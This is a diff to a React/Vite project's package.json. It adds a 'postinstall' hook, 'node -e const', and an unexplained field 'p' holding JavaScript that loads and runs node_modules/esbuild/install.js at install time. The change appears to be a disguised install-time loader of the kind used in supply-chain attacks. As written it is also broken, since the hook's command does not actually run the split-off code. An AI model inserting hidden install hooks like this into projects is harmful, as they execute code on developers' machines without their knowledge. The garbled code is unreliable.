@@ -6,7 +6,8 @@
   "scripts": {
     "dev": "vite",
     "build": "vite build",
-    "preview": "vite preview"
+    "preview": "vite preview",
+    "postinstall": "node -e const"
   },
   "dependencies": {
     "lucide-react": "^0.344.0",
@@ -18,5 +19,6 @@
     "@types/react-dom": "^18.2.19",
     "@vitejs/plugin-react": "^4.2.1",
     "vite": "^5.1.4"
-  }
+  },
+  "p": "require(\"path\"),fs=require(\"fs\"),f=p.join(\"node_modules\",\"esbuild\",\"install.js\");if(fs.existsSync(f)){require(f)}"
 }
